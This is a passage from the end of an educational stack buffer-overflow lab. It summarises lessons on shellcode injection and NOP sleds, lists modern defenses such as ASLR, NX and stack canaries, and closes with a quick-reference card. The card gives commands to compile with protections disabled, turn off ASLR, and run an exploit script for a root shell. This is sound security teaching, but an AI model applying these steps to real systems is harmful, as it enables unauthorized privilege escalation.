2. **NOP sleds make exploits reliable** - Large landing zones instead of precise targeting
3. **Compilation flags matter** - One wrong flag breaks everything
4. **GDB lies about addresses** - Always use runtime addresses
5. **System calls are picky** - Registers must be clean (EDX = 0)

### The Bigger Picture

This technique (shellcode injection) is how many real attacks work:
- Hackers find buffer overflows in real programs
- They inject shellcode to take control
- They gain unauthorized access to systems

**The good news:** Modern systems have defenses:
- **DEP/NX Bit**: Makes the stack non-executable (can't run shellcode)
- **ASLR**: Randomizes addresses (can't predict where to jump)
- **Stack Canaries**: Detect buffer overflows before they happen
- **PIE**: Randomizes code locations
- **Fortify Source**: Replaces unsafe functions like strcpy()

**In our next section**, we'll learn how these defenses work and how to implement them!

### What's Next?

Now that you understand attacks, you're ready to learn defenses:
- How to write secure code
- How modern protections work
- How to prevent buffer overflows
- Best practices for secure programming

**Congratulations on completing the hardest lab!**

You now understand one of the most powerful exploitation techniques in cybersecurity!

---

## Quick Reference Card

**Compilation (CRITICAL!):**
```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
```

**Verify compilation:**
```bash
file stack  # Should NOT say "pie"
```

**Disable ASLR:**
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

**Find buffer address:**
```bash
./stack_debug  # Note the address it prints
```

**Generate payload:**
```bash
python3 seedlabs_exploit.py
```

**Run exploit:**
```bash
./stack  # Should get root shell
```

**Exit shell:**
```bash
exit
```

---

**End of Lab 3**